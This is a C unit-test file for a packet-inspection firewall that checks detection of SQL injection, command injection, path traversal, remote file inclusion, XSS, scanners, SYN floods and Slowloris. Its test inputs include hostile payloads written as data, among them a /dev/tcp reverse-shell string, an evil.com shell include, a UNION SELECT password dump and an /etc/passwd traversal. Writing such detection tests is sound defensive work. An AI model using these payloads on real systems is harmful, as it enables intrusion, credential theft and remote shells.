#define BUILD_USERSPACE
#include "userspace_compat.h"
#include "fw_inspect.h"
#include "sqli_detect.h"
#include "cmdi_detect.h"
#include "path_detect.h"
#include "bot_detect.h"
#include "ip_reputation.h"
#include "yara_engine.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>

// Mock Alert tracking state
static int last_threat_type = -1;
static int alert_count = 0;

void send_fw_event(struct fw_event *event) {
    printf("  [MOCK ALERT] Threat: %d, Severity: %d, Preview: '%s'\n", 
           event->threat_type, event->severity, event->payload_preview);
    last_threat_type = event->threat_type;
    alert_count++;
}

// Function declarations from detection components
extern int inspect_ip_blocklist(uint32_t src_ip);
extern void update_ip_blocklist(struct blocklist_payload *payload);
extern int init_conn_pool(void);
extern void cleanup_conn_pool(void);
extern int monitor_tcp_stats(struct iphdr *iph, struct tcphdr *tcph);
extern int inspect_http_payload(struct sk_buff *skb, struct iphdr *iph, struct tcphdr *tcph);

// Reset tracker helper
static void reset_tracker() {
    last_threat_type = -1;
    alert_count = 0;
}

// -------------------------------------------------------------
// HTTP INSPECTOR TESTS
// -------------------------------------------------------------
static void construct_mock_packet(struct sk_buff *skb, struct iphdr *iph, struct tcphdr *tcph, const char *http_payload, unsigned char *buf, size_t buf_len) {
    int payload_len = strlen(http_payload);
    int total_len = 40 + payload_len;
    assert(total_len <= buf_len);

    memset(buf, 0, total_len);

    struct iphdr *ip = (struct iphdr *)buf;
    ip->version = 4;
    ip->ihl = 5;
    ip->tot_len = htons(total_len);
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr("192.168.1.10");
    ip->daddr = inet_addr("192.168.1.20");

    struct tcphdr *tcp = (struct tcphdr *)(buf + 20);
    tcp->source = htons(12345);
    tcp->dest = htons(80);
    tcp->doff = 5;

    memcpy(buf + 40, http_payload, payload_len);
    
    skb->data = buf;
    skb->len = total_len;

    *iph = *ip;
    *tcph = *tcp;
}

void test_http_inspector() {
    printf("--- Running HTTP Inspector Tests ---\n");

    // Test Case 1: Benign GET Request (Should be allowed)
    {
        reset_tracker();
        struct sk_buff skb;
        unsigned char data[512];
        struct iphdr iph;
        struct tcphdr tcph;

        construct_mock_packet(&skb, &iph, &tcph, 
                              "GET /index.html HTTP/1.1\r\nHost: localhost\r\n\r\n", 
                              data, sizeof(data));

        int result = inspect_http_payload(&skb, &iph, &tcph);
        assert(result == 0);
        assert(alert_count == 0);
        printf("  Test 1 (Benign HTTP GET): Passed\n");
    }

    // Test Case 2: PHP Shell Injection (eval in body) (Should be blocked)
    {
        reset_tracker();
        struct sk_buff skb;
        unsigned char data[512];
        struct iphdr iph;
        struct tcphdr tcph;

        construct_mock_packet(&skb, &iph, &tcph, 
                              "POST /index.php HTTP/1.1\r\nContent-Length: 10\r\n\r\neval(data)", 
                              data, sizeof(data));

        int result = inspect_http_payload(&skb, &iph, &tcph);
        assert(result == 1);
        assert(alert_count == 1);
        assert(last_threat_type == THREAT_PHP_SHELL);
        printf("  Test 2 (PHP Shell Injection): Passed\n");
    }

    // Test Case 3: XSS Query Vector (<script> in query string) (Should be blocked)
    {
        reset_tracker();
        struct sk_buff skb;
        unsigned char data[512];
        struct iphdr iph;
        struct tcphdr tcph;

        construct_mock_packet(&skb, &iph, &tcph, 
                              "GET /?q=<script>alert(1)</script> HTTP/1.1\r\nHost: localhost\r\n\r\n", 
                              data, sizeof(data));

        int result = inspect_http_payload(&skb, &iph, &tcph);
        assert(result == 1);
        assert(alert_count == 1);
        assert(last_threat_type == THREAT_XSS);
        printf("  Test 3 (XSS script Vector): Passed\n");
    }

    // Test Case 4: Near-match Safe String (Should be allowed)
    {
        reset_tracker();
        struct sk_buff skb;
        unsigned char data[512];
        struct iphdr iph;
        struct tcphdr tcph;

        construct_mock_packet(&skb, &iph, &tcph, 
                              "GET /index.php?name=systematic_evaluation HTTP/1.1\r\nHost: localhost\r\n\r\n", 
                              data, sizeof(data));

        int result = inspect_http_payload(&skb, &iph, &tcph);
        assert(result == 0);
        assert(alert_count == 0);
        printf("  Test 4 (Near-match Safe String): Passed\n");
    }
}

// -------------------------------------------------------------
// NEW ADVANCED DETECTION MODULE TESTS
// -------------------------------------------------------------
void test_advanced_detectors() {
    printf("--- Running SQLi, CMDi, Path/LFI/RFI, Bot, and IP reputation Tests ---\n");

    // SQL Injection Test
    {
        char pattern[128], details[256];
        int score1 = detect_sqli("id=1+union+select+null,username,password+from+users", 52, pattern, sizeof(pattern), details, sizeof(details));
        assert(score1 >= 40);
        assert(strstr(pattern, "UNION SELECT"));

        int score2 = detect_sqli("user=admin'+or+1=1--", 20, pattern, sizeof(pattern), details, sizeof(details));
        assert(score2 >= 40);
        assert(strstr(pattern, "TAUTOLOGY"));
        printf("  SQLi Detection Tests: Passed\n");
    }

    // Command Injection Test
    {
        char pattern[128], details[256];
        int score1 = detect_cmdi("cmd=;whoami", 11, pattern, sizeof(pattern), details, sizeof(details));
        assert(score1 >= 40);
        assert(strstr(pattern, "META_CHAR") || strstr(pattern, "SHELL_CMD"));

        int score2 = detect_cmdi("input=bash+-i+>%26+/dev/tcp/10.0.0.1/4444", 40, pattern, sizeof(pattern), details, sizeof(details));
        assert(score2 >= 40);
        assert(strstr(pattern, "REV_SHELL") || strstr(pattern, "DEV_TCP"));
        printf("  CMDi Detection Tests: Passed\n");
    }

    // Path Traversal / LFI / RFI Test
    {
        char pattern[128], details[256];
        int score1 = detect_path_traversal("file=../../../../etc/passwd", 31, pattern, sizeof(pattern), details, sizeof(details));
        assert(score1 >= 40);
        assert(strstr(pattern, "TRAVERSAL") || strstr(pattern, "LFI_TARGET"));

        int score2 = detect_path_traversal("include=http://evil.com/shell.php", 33, pattern, sizeof(pattern), details, sizeof(details));
        assert(score2 >= 40);
        assert(strstr(pattern, "RFI_HTTP"));
        printf("  Path/LFI/RFI Detection Tests: Passed\n");
    }

    // Bot / Scanner Test
    {
        char pattern[128], details[256];
        // sqlmap user agent request
        const char *http_req = "GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.4.5#stable\r\n\r\n";
        int score1 = detect_bot(http_req, strlen(http_req), pattern, sizeof(pattern), details, sizeof(details));
        assert(score1 >= 40);
        assert(strstr(pattern, "SCANNER_UA"));

        // Honeypot path check
        const char *http_req2 = "GET /wp-login.php HTTP/1.1\r\nHost: localhost\r\n\r\n";
        int score2 = detect_bot(http_req2, strlen(http_req2), pattern, sizeof(pattern), details, sizeof(details));
        assert(score2 >= 40);
        assert(strstr(pattern, "HONEYPOT_PATH"));
        printf("  Bot/Scanner Detection Tests: Passed\n");
    }

    // IP Reputation Test
    {
        uint32_t ip = inet_addr("198.51.100.12");
        assert(get_ip_reputation(ip) == 100); // Unknown IP → perfect reputation

        // Update reputation
        update_ip_reputation(ip, 30, THREAT_SQLI);
        assert(get_ip_reputation(ip) == 70); // 100 - 30

        update_ip_reputation(ip, 60, THREAT_CMDI);
        assert(get_ip_reputation(ip) == 10); // 70 - 60

        // Decay reputation (recovery)
        decay_reputation_scores(20);
        assert(get_ip_reputation(ip) == 30); // 10 + 20
        printf("  IP Reputation Tests: Passed\n");
    }
}

// -------------------------------------------------------------
// IP BLOCKLIST TESTS
// -------------------------------------------------------------
void test_ip_blocklist() {
    printf("--- Running IP Blocklist Tests ---\n");

    // Initialize list with some IPs
    struct blocklist_payload payload;
    payload.count = 2;
    
    // 192.168.1.50/32 (exact IP)
    payload.entries[0].ip = inet_addr("192.168.1.50");
    payload.entries[0].mask = 32;

    // 10.0.0.0/8 (class A network)
    payload.entries[1].ip = inet_addr("10.0.0.0");
    payload.entries[1].mask = 8;

    update_ip_blocklist(&payload);

    // Test Case 1: Exact Match (Blocked)
    {
        uint32_t ip = inet_addr("192.168.1.50");
        int res = inspect_ip_blocklist(ip);
        assert(res == 1);
        printf("  Test 1 (Exact Blocklist IP): Passed\n");
    }

    // Test Case 2: No Match on neighbor IP (Allowed)
    {
        uint32_t ip = inet_addr("192.168.1.51");
        int res = inspect_ip_blocklist(ip);
        assert(res == 0);
        printf("  Test 2 (Neighbor Allowed IP): Passed\n");
    }

    // Test Case 3: CIDR Subnet Match (Blocked)
    {
        uint32_t ip = inet_addr("10.250.4.5");
        int res = inspect_ip_blocklist(ip);
        assert(res == 1);
        printf("  Test 3 (Class A Subnet IP): Passed\n");
    }

    // Test Case 4: Out of Subnet Range (Allowed)
    {
        uint32_t ip = inet_addr("11.0.0.1");
        int res = inspect_ip_blocklist(ip);
        assert(res == 0);
        printf("  Test 4 (Outside Subnet IP): Passed\n");
    }
}

// -------------------------------------------------------------
// TCP MONITOR TESTS
// -------------------------------------------------------------
void test_tcp_monitor() {
    printf("--- Running TCP Monitor Tests ---\n");

    assert(init_conn_pool() == 0);

    // Test Case 1: SYN Flood Detection
    {
        reset_tracker();
        struct iphdr iph;
        iph.saddr = inet_addr("192.168.99.1");
        iph.daddr = inet_addr("192.168.99.20");

        struct tcphdr tcph;
        tcph.source = htons(4321);
        tcph.dest = htons(80);
        tcph.syn = 1;
        tcph.ack = 0;

        // Send 100 packets (threshold is 100)
        int drop = 0;
        for (int i = 0; i < 100; i++) {
            drop = monitor_tcp_stats(&iph, &tcph);
            assert(drop == 0);
        }
        assert(alert_count == 0);

        // 101st packet triggers alert and drops
        drop = monitor_tcp_stats(&iph, &tcph);
        assert(drop == 1);
        assert(alert_count == 1);
        assert(last_threat_type == THREAT_SYN_FLOOD);
        printf("  Test 1 (SYN Flood Interception): Passed\n");
    }

    // Test Case 2: Slowloris Timeout Detection
    {
        reset_tracker();
        struct iphdr iph;
        iph.saddr = inet_addr("192.168.99.2");
        iph.daddr = inet_addr("192.168.99.20");

        struct tcphdr tcph;
        tcph.source = htons(5432);
        tcph.dest = htons(80);
        tcph.syn = 0;
        tcph.ack = 1;

        // Send normal segments
        int drop = monitor_tcp_stats(&iph, &tcph);
        assert(drop == 0);

        struct conn_state {
            uint32_t src_ip;
            uint16_t src_port;
            uint16_t dest_port;
            unsigned long last_seen;
            unsigned long syn_window_start;
            uint32_t syn_count;
            unsigned long http_start_time;
            uint8_t http_header_count;
            uint8_t is_http_complete;
            uint8_t is_blocked;
        };
        extern struct conn_state *test_get_conn_state(uint32_t ip, uint16_t port);
        struct conn_state *state = test_get_conn_state(iph.saddr, tcph.source);
        assert(state != NULL);
        state->http_start_time = jiffies - 3500; // set HTTP start time 35s ago

        // Next segment should trigger Slowloris and drop!
        drop = monitor_tcp_stats(&iph, &tcph);
        assert(drop == 1);
        assert(alert_count == 1);
        assert(last_threat_type == THREAT_SLOWLORIS);
        printf("  Test 2 (Slowloris Timeout Interception): Passed\n");
    }

    cleanup_conn_pool();
}

int main() {
    printf("===========================================\n");
    printf("NULLSPLOIT CORE LOGIC VALIDATION UNIT TESTS\n");
    printf("===========================================\n");

    init_ip_reputation();
    init_yara_engine("/etc/fw_inspect/yara");

    test_http_inspector();
    test_advanced_detectors();
    test_ip_blocklist();
    test_tcp_monitor();

    cleanup_yara_engine();
    cleanup_ip_reputation();

    printf("===========================================\n");
    printf("ALL TESTS PASSED SUCCESSFULLY!\n");
    printf("===========================================\n");
    return 0;
}
